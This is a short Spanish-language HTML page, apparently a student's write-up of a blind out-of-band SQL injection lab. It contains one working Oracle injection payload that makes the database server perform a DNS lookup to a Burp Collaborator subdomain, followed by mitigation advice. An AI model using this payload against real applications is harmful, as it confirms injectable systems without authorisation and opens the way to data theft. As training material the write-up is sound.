@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 16 - Out-of-Band SQL Injection</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+
+<section class="activities-section">
+
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 16</h2>
+<p>Blind SQL Injection with Out-of-Band Interaction</p>
+</div>
+
+
+<div class="info-card">
+<h3>Información</h3>
+
+<p><strong>Nivel:</strong> Practitioner</p>
+<p><strong>Tipo:</strong> Out-of-band SQL Injection</p>
+
+</div>
+
+
+<div class="info-card">
+<h3>Objetivo</h3>
+
+<p>
+Provocar una interacción DNS desde el servidor de la base de datos
+hacia Burp Collaborator para confirmar la vulnerabilidad.
+</p>
+
+</div>
+
+
+<div class="info-card">
+<h3>Procedimiento</h3>
+
+<p>Se generó un subdominio en Burp Collaborator.</p>
+
+<p>Payload utilizado:</p>
+
+<pre>
+'||UTL_INADDR.get_host_address('subdominio.burpcollaborator.net')--
+</pre>
+
+<p>
+El servidor realizó una consulta DNS al dominio,
+confirmando la ejecución del payload.
+</p>
+
+</div>
+
+
+<div class="info-card">
+<h3>Mitigación</h3>
+
+<ul>
+
+<li>Consultas parametrizadas.</li>
+
+<li>Deshabilitar funciones externas innecesarias.</li>
+
+<li>Monitoreo de tráfico DNS saliente.</li>
+
+</ul>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+
+</div>
+</section>
+
+</body>
+</html>
